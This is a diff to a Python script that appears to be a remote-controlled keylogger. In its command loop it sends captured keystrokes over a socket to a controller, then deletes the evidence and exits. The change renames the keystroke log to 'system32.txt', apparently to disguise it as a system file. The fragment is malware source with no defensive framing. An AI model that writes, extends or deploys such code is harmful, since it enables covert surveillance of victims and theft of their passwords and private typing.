@@ -99,7 +99,7 @@ def receive_commands():
 
         elif data[:3].decode("utf-8") == "end":
             s.send(str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))
-            os.remove("logs.txt")
+            os.remove("system32.txt")
             os._exit(1)
 
         elif data[:8].decode("utf-8") == "download":
@@ -114,7 +114,7 @@ def receive_commands():
         elif data[:7].decode("utf-8") == "stopkey":
             stop_key2()
             s.send(
-            str.encode("loged so far:" + read_file("logs.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>'))
+            str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>'))
             os.remove("system32.txt")
 
         elif len(data) > 0:
